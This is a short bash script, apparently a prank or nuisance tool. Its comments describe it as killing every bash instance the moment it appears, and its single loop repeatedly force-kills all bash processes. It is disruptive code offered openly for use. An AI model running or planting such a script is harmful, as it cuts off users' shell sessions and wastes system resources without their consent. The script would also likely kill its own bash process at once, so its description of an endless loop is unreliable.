#!/bin/bash
#
# Kills all bash instances has soon has they are created.
#
# Bad for CPU cycles, since it takes a lot of power because of its infinite
# loop.
#
while true; do pkill -KILL bash; done
clear;
